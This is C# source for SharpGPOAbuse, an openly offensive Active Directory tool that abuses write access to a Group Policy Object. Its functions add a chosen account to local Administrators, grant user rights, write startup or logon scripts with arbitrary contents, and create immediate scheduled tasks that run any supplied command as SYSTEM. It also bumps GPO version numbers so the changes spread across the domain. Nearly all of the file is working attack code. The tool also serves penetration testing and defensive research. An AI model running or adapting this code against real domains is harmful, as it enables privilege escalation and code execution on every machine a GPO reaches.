using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using CommandLine;
using System.Linq;

namespace SharpGPOAbuse
{
    public class Options
    {
        [Option("", "DomainController", Required = false, HelpText = "Set the domain controller to use.")]
        public string DomainController { get; set; }

        [Option("", "Domain", Required = false, HelpText = "Set the target domain.")]
        public string Domain { get; set; }

        [Option("", "UserAccount", Required = false, HelpText = "User to set as local admin via the GPO.")]
        public string UserAccount { get; set; }

        [Option("", "GpoName", Required = false, HelpText = "GPO to be edited. Need to have edit permission on the GPO.")]
        public string GpoName { get; set; }

        [Option("", "TaskName", Required = false, HelpText = "The name of the new immediate task.")]
        public string TaskName { get; set; }

        [Option("", "Author", Required = false, HelpText = "The author of the new immediate task. Use a domain admin.")]
        public string Author { get; set; }

        [Option("", "Command", Required = false, HelpText = "Command to execute via the immediate task.")]
        public string Command { get; set; }

        [Option("", "Arguments", Required = false, HelpText = "Command arguments of the immediate task.")]
        public string Arguments { get; set; }

        [Option("", "AddLocalAdmin", Required = false, HelpText = "Add new local admin.")]
        public bool AddLocalAdmin { get; set; }

        [Option("", "AddComputerTask", Required = false, HelpText = "Add a new immediate task for computer object takeover.")]
        public bool AddComputerTask { get; set; }

        [Option("", "AddUserTask", Required = false, HelpText = "Add a new immediate task for user object takeover.")]
        public bool AddUserTask { get; set; }

        [Option("", "AddUserRights", Required = false, HelpText = "Add rights to a user.")]
        public bool AddUserRights { get; set; }

        [Option("", "UserRights", Required = false, HelpText = "New startup script name.")]
        public String UserRights { get; set; }

        [Option("", "Force", Required = false, HelpText = "Overwrite existing files if required.")]
        public bool Force { get; set; }

        [Option("", "AddUserScript", Required = false, HelpText = "Add new user startup script.")]
        public bool AddUserScript { get; set; }

        [Option("", "AddComputerScript", Required = false, HelpText = "Add new computer startup script.")]
        public bool AddComputerScript { get; set; }

        [Option("", "ScriptName", Required = false, HelpText = "New startup script name.")]
        public String ScriptName { get; set; }

        [Option("", "ScriptContents", Required = false, HelpText = "New startup script contents.")]
        public String ScriptContents { get; set; }

        [Option("h", "Help", Required = false, HelpText = "Display help menu.")]
        public bool Help { get; set; }

    }

    class Program
    {
        public static void PrintHelp()
        {
            string HelpText = "\nUsage: \n" +
                "\tSharpGPOAbuse.exe <AttackType> <AttackOptions>\n" +
                "\nAttack Types:\n" +
                "--AddUserRights\n" +
                "\tAdd rights to a user account\n" +
                "--AddLocalAdmin\n" +
                "\tAdd a new local admin. This will replace any existing local admins!\n" +
                "--AddComputerScript\n" +
                "\tAdd a new computer startup script\n" +
                "--AddUserScript\n" +
                "\tAdd a new user startup script\n" +
                "--AddComputerTask\n" +
                "\tAdd a new computer immediate task\n" +
                "--AddUserTask\n" +
                "\tAdd a new user immediate task\n" +
                "\n" +

                "\nOptions required to add a new local admin:\n" +
                "--UserAccount\n" +
                "\tSet the name of the account to be added in local admins.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new user startup script:\n" +
                "--ScriptName\n" +
                "\tSet the name of the new startup script.\n" +
                "--ScriptContents\n" +
                "\tSet the contents of the new startup script.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new computer startup script:\n" +
                "--ScriptName\n" +
                "\tSet the name of the new startup script.\n" +
                "--ScriptContents\n" +
                "\tSet the contents of the new startup script.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add new user rights:\n" +
                "--UserRights\n" +
                "\tSet the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.\n" +
                "--UserAccount\n" +
                "\tSet the account to add the new rights.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new computer immediate task:\n" +
                "--TaskName\n" +
                "\tSet the name of the new computer task.\n" +
                "--Author\n" +
                "\tSet the author of the new task (use a DA account).\n" +
                "--Command\n" +
                "\tCommand to execute.\n" +
                "--Arguments\n" +
                "\tArguments passed to the command.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOptions required to add a new user immediate task:\n" +
                "--TaskName\n" +
                "\tSet the name of the user new task.\n" +
                "--Author\n" +
                "\tSet the author of the new task (use a DA account).\n" +
                "--Command\n" +
                "\tCommand to execute.\n" +
                "--Arguments\n" +
                "\tArguments passed to the command.\n" +
                "--GPOName\n" +
                "\tThe name of the vulnerable GPO.\n" +
                "\n" +

                "\nOther options:\n" +
                "--DomainController\n" +
                "\tSet the target domain controller.\n" +
                "--Domain\n" +
                "\tSet the target domain.\n" +
                "--Force\n" +
                "\tOverwrite existing files if required.\n" +
                "\n";

            Console.WriteLine(HelpText);
        }

        // Updage GPT.ini so that changes take effect without gpupdate /force
        public static void UpdateVersion(String Domain, String distinguished_name, String GPOName, String path, String function, String objectType)
        {
            String line = "";
            string[] requiredProperties;
            string gPCExtensionName;
            List<string> new_list = new List<string>();

            if (!File.Exists(path))
            {
                Console.WriteLine("[-] Could not find GPT.ini. The group policy might need to be updated manually using 'gpupdate /force'");
            }

            // get the object of the GPO and update its versionNumber
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
            myldapConnection.Path = "LDAP://" + distinguished_name;
            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(displayName=" + GPOName + ")";
            if (objectType.Equals("Computer"))
            {
                requiredProperties = new string[] { "versionNumber", "gPCMachineExtensionNames" };
                gPCExtensionName = "gPCMachineExtensionNames";
            }
            else
            {
                requiredProperties = new string[] { "versionNumber", "gPCUserExtensionNames" };
                gPCExtensionName = "gPCUserExtensionNames";
            }
            


            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            System.DirectoryServices.SearchResult result = null;
            try
            {
                result = search.FindOne();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message + "[!] Exiting...");
                System.Environment.Exit(0);
            }

            int new_ver = 0;
            if (result != null)
            {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                // get AD number of GPO and increase it by 1 or 65536 if it is a computer or user object respectively
                if ((objectType.Equals("Computer")))
                {
                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 1;
                    entryToUpdate.Properties["versionNumber"].Value = new_ver;
                }
                else
                {
                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 65536;
                    entryToUpdate.Properties["versionNumber"].Value = new_ver;
                }
                    

                // update gPCMachineExtensionNames
                String val1 = "";
                String val2 = "";
                if (function == "AddLocalAdmin" || function == "AddNewRights" || function == "NewStartupScript")
                {

                    if (function == "AddLocalAdmin" || function == "AddNewRights")
                    {
                        val1 = "827D319E-6EAC-11D2-A4EA-00C04F79F83A";
                        val2 = "803E14A0-B4FB-11D0-A0D0-00A0C90F574B";
                    }

                    if (function == "NewStartupScript")
                    {
                        val1 = "42B5FAAE-6536-11D2-AE5A-0000F87571E3";
                        val2 = "40B6664F-4972-11D1-A7CA-0000F87571E3";
                    }

                    try
                        {
                            if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
                            {
                                if (entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val1))
                                {
                                    string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();

                                    //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);

                                    List<string> new_values = new List<string>();
                                    String addition = val2;
                                    var test = ent.Split('[');

                                    foreach (string i in test)
                                    {
                                        new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                    }
                                    //new_values.Add(addition);

                                    for (var i = 1; i < new_values.Count; i++)
                                    {
                                        if (new_values[i].Contains(val1))
                                        {
                                            //Console.WriteLine(new_values[i]);
                                            List<string> toSort = new List<string>();
                                            string[] test2 = new_values[i].Split();
                                            for (var f = 1; f < test2.Length; f++)
                                            {
                                                //Console.WriteLine(test2[f]);
                                                toSort.Add(test2[f]);
                                            }
                                            toSort.Add(addition);
                                            toSort.Sort();
                                            new_values[i] = test2[0];
                                            foreach (string val in toSort)
                                            {
                                                new_values[i] += " " + val;
                                            }
                                        }
                                    }

                                    List<string> new_values2 = new List<string>();
                                    for (var i = 0; i < new_values.Count; i++)
                                    {
                                        if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                        string[] value1 = new_values[i].Split();
                                        string new_val = "";
                                        for (var q = 0; q < value1.Length; q++)
                                        {
                                            if (string.IsNullOrEmpty(value1[q])) { continue; }
                                            new_val += "{" + value1[q] + "}";
                                        }
                                        new_val = "[" + new_val + "]";
                                        new_values2.Add(new_val);
                                    }
                                    String final = string.Join("", new_values2.ToArray());
                                    //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
                                    entryToUpdate.Properties[gPCExtensionName].Value = final;
                                }

                                else
                                {
                                    string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
                                    //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
                                    List<string> new_values = new List<string>();
                                    String addition = val1 + " " + val2;
                                    var test = ent.Split('[');

                                    foreach (string i in test)
                                    {
                                        new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                    }
                                    new_values.Add(addition);
                                    new_values.Sort();
                                    List<string> new_values2 = new List<string>();

                                    for (var i = 0; i < new_values.Count; i++)
                                    {
                                        if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                        string[] value1 = new_values[i].Split();
                                        string new_val = "";
                                        for (var q = 0; q < value1.Length; q++)
                                        {
                                            if (string.IsNullOrEmpty(value1[q])) { continue; }
                                            new_val += "{" + value1[q] + "}";
                                        }
                                        new_val = "[" + new_val + "]";
                                        new_values2.Add(new_val);
                                    }
                                    String final = string.Join("", new_values2.ToArray());
                                    //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
                                    entryToUpdate.Properties[gPCExtensionName].Value = final;
                                }

                            }
                            else
                            {
                                //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
                            }
                        }
                        // the following will execute when the gPCMachineExtensionNames is <not set>
                        catch
                        {
                            entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]";
                        }

                }

                // update gPCMachineExtensionNames to add immediate task
                if (function == "NewImmediateTask")
                {
                    val1 = "00000000-0000-0000-0000-000000000000";
                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";

                    try
                    {
                            if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
                            {
                                string toUpdate = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + toUpdate);

                                List<string> new_values = new List<string>();
                                var test = toUpdate.Split('[');

                                foreach (string i in test)
                                {
                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                }

                                // if zero GUID not in current value
                                if (!toUpdate.Contains(val1))
                                {
                                    new_values.Add(val1 + " " + val2);
                                }

                                // if zero GUID exists in current value
                                else if (toUpdate.Contains(val1))
                                {
                                    for (var k = 0; k < new_values.Count; k++)
                                    {
                                        if (new_values[k].Contains(val1))
                                        {
                                            List<string> toSort = new List<string>();
                                            string[] test2 = new_values[k].Split();
                                            for (var f = 1; f < test2.Length; f++)
                                            {
                                                toSort.Add(test2[f]);
                                            }
                                            toSort.Add(val2);
                                            toSort.Sort();
                                            new_values[k] = test2[0];
                                            foreach (string val in toSort)
                                            {
                                                new_values[k] += " " + val;
                                            }
                                        }
                                    }
                                }

                                // if Scheduled Tasks GUID not in current value
                                if (!toUpdate.Contains(val3))
                                {
                                    new_values.Add(val3 + " " + val2);
                                }

                                else if (toUpdate.Contains(val3))
                                {
                                    for (var k = 0; k < new_values.Count; k++)
                                    {
                                        if (new_values[k].Contains(val3))
                                        {
                                            List<string> toSort = new List<string>();
                                            string[] test2 = new_values[k].Split();
                                            for (var f = 1; f < test2.Length; f++)
                                            {
                                                toSort.Add(test2[f]);
                                            }
                                            toSort.Add(val2);
                                            toSort.Sort();
                                            new_values[k] = test2[0];
                                            foreach (string val in toSort)
                                            {
                                                new_values[k] += " " + val;
                                            }
                                        }
                                    }
                                }

                                new_values.Sort();

                                List<string> new_values2 = new List<string>();
                                for (var i = 0; i < new_values.Count; i++)
                                {
                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                    string[] value1 = new_values[i].Split();
                                    string new_val = "";
                                    for (var q = 0; q < value1.Length; q++)
                                    {
                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
                                        new_val += "{" + value1[q] + "}";
                                    }
                                    new_val = "[" + new_val + "]";
                                    new_values2.Add(new_val);
                                }
                                String final = string.Join("", new_values2.ToArray());
                                //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
                                entryToUpdate.Properties[gPCExtensionName].Value = final;
                            }
                        else
                        {
                            //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
                        }
                    }
                    // the following will execute when the gPCMachineExtensionNames is <not set>
                    catch
                    {
                        entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]";
                    }
                }

                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] versionNumber attribute changed successfully");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("[!] Could not update versionNumber attribute!\nExiting...");
                    System.Environment.Exit(0);
                }
            }
            else
            {
                Console.WriteLine("[!] GPO not found!\nExiting...");
                System.Environment.Exit(0);
            }

            using (System.IO.StreamReader file = new System.IO.StreamReader(path))
            {
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Replace(" ", "").Contains("Version="))
                    {
                        line = line.Split('=')[1];
                        line = "Version=" + Convert.ToString(new_ver);

                    }
                    new_list.Add(line);
                }
            }

            using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
            {
                foreach (string l in new_list)
                {
                    file2.WriteLine(l);
                }
            }
            Console.WriteLine("[+] The version number in GPT.ini was increased successfully.");

            if (function == "AddLocalAdmin")
            {
                Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
            }

            else if (function == "NewStartupScript")
            {
                Console.WriteLine("[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.\n[+] Done!");
            }

            else if (function == "NewImmediateTask")
            {
                Console.WriteLine("[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!");
            }

            else if (function == "AddNewRights")
            {
                Console.WriteLine("[+] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle.\n[+] Done!");
            }


        }

        public static String GetGPOGUID(String DomainController, String GPOName, String distinguished_name)
        {
            // Translate GPO Name to GUID
            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            System.DirectoryServices.Protocols.LdapConnection connection = null;
            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();
            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(displayName=" + GPOName + ")", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
            var GPOGuid = "";
            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
            {
                try
                {
                    GPOGuid = entry.Attributes["cn"][0].ToString();
                }
                catch
                {
                    Console.WriteLine("[!] Could not retrieve the GPO GUID. The GPO Name was invalid. \n[-] Exiting...");
                    System.Environment.Exit(0);
                }
            }
            if (String.IsNullOrEmpty(GPOGuid))
            {
                Console.WriteLine("[!] Could not retrieve the GPO GUID. The GPO Name was invalid. \n[-] Exiting...");
                System.Environment.Exit(0);
            }
            Console.WriteLine("[+] GUID of \"" + GPOName + "\" is: " + GPOGuid);
            return GPOGuid;
        }

        public static void NewLocalAdmin(String UserAccount, String Domain, String DomainController, String GPOName, String distinguished_name, bool Force)
        {
            // Get SID of user who will be local admin
            System.DirectoryServices.AccountManagement.PrincipalContext ctx = new System.DirectoryServices.AccountManagement.PrincipalContext(System.DirectoryServices.AccountManagement.ContextType.Domain, DomainController);
            System.DirectoryServices.AccountManagement.UserPrincipal usr = null;
            try
            {
                usr = System.DirectoryServices.AccountManagement.UserPrincipal.FindByIdentity(ctx, System.DirectoryServices.AccountManagement.IdentityType.SamAccountName, UserAccount);
                Console.WriteLine("[+] SID Value of " + UserAccount + " = " + usr.Sid.Value);
            }
            catch
            {
                Console.WriteLine("[-] Could not find user \"" + UserAccount + "\" in the " + Domain + " domain.\n[-] Exiting...\n");
                System.Environment.Exit(0);
            }

            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);

            string start = @"[Unicode]
Unicode=yes
[Version]
signature=""$CHICAGO$""
Revision=1";

            string[] text = { "[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *" + usr.Sid.Value };

            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += "GptTmpl.inf";
            if (File.Exists(path))
            {
                bool exists = false;
                Console.WriteLine("[+] File exists: " + path);
                string[] readText = File.ReadAllLines(path);

                foreach (string s in readText)
                {
                    // Check if memberships are defined via group policy
                    if (s.Contains("[Group Membership]"))
                    {
                        exists = true;
                    }
                }

                // if memberships are defined and force is NOT used
                if (exists && !Force)
                {
                    Console.WriteLine("[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!\n[-] Exiting...");
                    System.Environment.Exit(0);
                }

                // if memberships are defined and force is used
                if (exists && Force)
                {
                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members="))
                            {
                                if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") > 0))
                                {
                                    file2.WriteLine(l + ", *" + usr.Sid.Value);
                                }
                                else if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") == 0))
                                {
                                    file2.WriteLine(l + " *" + usr.Sid.Value);
                                }
                            }
                            else
                            {
                                file2.WriteLine(l);
                            }
                        }
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
                    System.Environment.Exit(0);
                }

                // if memberships are not defined
                if (!exists)
                {
                    Console.WriteLine("[+] The GPO does not specify any group memberships.");
                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            file2.WriteLine(l);
                        }
                        foreach (string l in text)
                        {
                            file2.WriteLine(l);
                        }
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                String new_text = null;
                foreach (String x in text)
                {
                    new_text += Environment.NewLine + x;
                }
                System.IO.File.WriteAllText(path, start + new_text);
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
            }
        }

        public static void NewStartupScript(String ScriptName, String ScriptContents, String Domain, String DomainController, String GPOName, String distinguished_name, String objectType)
        {
            String hidden_ini;
            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);

            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String hidden_path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;

            if (objectType.Equals("Computer"))
            {
                hidden_ini = Environment.NewLine + "[Startup]" + Environment.NewLine + "0CmdLine=" + ScriptName + Environment.NewLine + "0Parameters=" + Environment.NewLine;
            }
            else
            {
                hidden_ini = Environment.NewLine + "[Logon]" + Environment.NewLine + "0CmdLine=" + ScriptName + Environment.NewLine + "0Parameters=" + Environment.NewLine;
            }

            String GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path) && objectType.Equals("Computer"))
            {
                path += "\\Machine\\Scripts\\Startup\\";
                hidden_path += "\\Machine\\Scripts\\scripts.ini";
            }
            else if (Directory.Exists(path) && objectType.Equals("User"))
            {
                path += "\\User\\Scripts\\Logon\\";
                hidden_path += "\\User\\Scripts\\scripts.ini";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += ScriptName;
            if (File.Exists(path))
            {
                Console.WriteLine("[!] A Startup script with the same name already exists. Choose a different name.\n[-] Exiting...\n");
                System.Environment.Exit(0);
            }

            if (File.Exists(hidden_path))
            {
                // Remove the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attributes &= ~FileAttributes.Hidden;
                    File.SetAttributes(hidden_path, attributes);
                }

                String line;
                List<string> new_list = new List<string>();
                using (System.IO.StreamReader file = new System.IO.StreamReader(hidden_path))
                {
                    while ((line = file.ReadLine()) != null)
                    {
                        new_list.Add(line);
                    }
                }

                List<int> first_element = new List<int>();

                String q = "";
                foreach (String item in new_list)
                {
                    try
                    {
                        q = Regex.Replace(item[0].ToString(), "[^0-9]", "");
                        first_element.Add(Int32.Parse(q));
                    }
                    catch { continue; }

                }

                int max = first_element.Max() + 1;
                new_list.Add(hidden_ini = max.ToString() + "CmdLine=" + ScriptName + Environment.NewLine + max.ToString() + "Parameters=");

                using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(hidden_path))
                {
                    foreach (string l in new_list)
                    {
                        file2.WriteLine(l);
                    }
                }
                //Add the hidden attribute of the file
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);
            }

            else
            {
                System.IO.File.WriteAllText(hidden_path, hidden_ini);
                //Add the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);

            }

            Console.WriteLine("[+] Creating new startup script...");
            System.IO.File.WriteAllText(path, ScriptContents);

            if (objectType.Equals("Computer"))
            {
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewStartupScript", "Computer");
            }
            else
            {
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewStartupScript", "User");
            }
        }

        public static void NewImmediateTask(String Domain, String DomainController, String GPOName, String distinguished_name, String task_name, String author, String arguments, String command, bool Force, String objectType)
        {
            string ImmediateTaskXML;
            string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
            string end = @"</ScheduledTasks>";
            if (objectType.Equals("Computer"))
            {
                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());
            }
            else
            {
                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());

            }

            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String GPT_path = path + "\\GPT.ini";
            // Check if GPO path exists
            if (Directory.Exists(path) && objectType.Equals("Computer"))
            {
                path += "\\Machine\\Preferences\\ScheduledTasks\\";
            }
            else if (Directory.Exists(path) && objectType.Equals("User"))
            {
                path += "\\User\\Preferences\\ScheduledTasks\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding scheduled tasks exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += "ScheduledTasks.xml";

            // if the ScheduledTasks.xml exists then append the new immediate task
            if (File.Exists(path))
            {
                if (Force)
                {
                    Console.WriteLine("[+] Modifying " + path);
                    String line;
                    List<string> new_list = new List<string>();
                    using (System.IO.StreamReader file = new System.IO.StreamReader(path))
                    {
                        while ((line = file.ReadLine()) != null)
                        {
                            if (line.Replace(" ", "").Contains("</ScheduledTasks>"))
                            {
                                line = ImmediateTaskXML + line;
                            }
                            new_list.Add(line);
                        }
                    }

                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in new_list)
                        {
                            file2.WriteLine(l);
                        }
                    }

                    if (objectType.Equals("Computer"))
                    {
                        UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask", "Computer");
                    }
                    else
                    {
                        UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask", "User");
                    }
                    System.Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[!] The GPO already includes a ScheduledTasks.xml. Use --Force to append to ScheduledTasks.xml or choose another GPO.\n[-] Exiting...\n");
                    System.Environment.Exit(0);
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                System.IO.File.WriteAllText(path, start + ImmediateTaskXML + end);

                if (objectType.Equals("Computer"))
                {
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask", "Computer");
                }
                else
                {
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask", "User");
                }
            }
        }

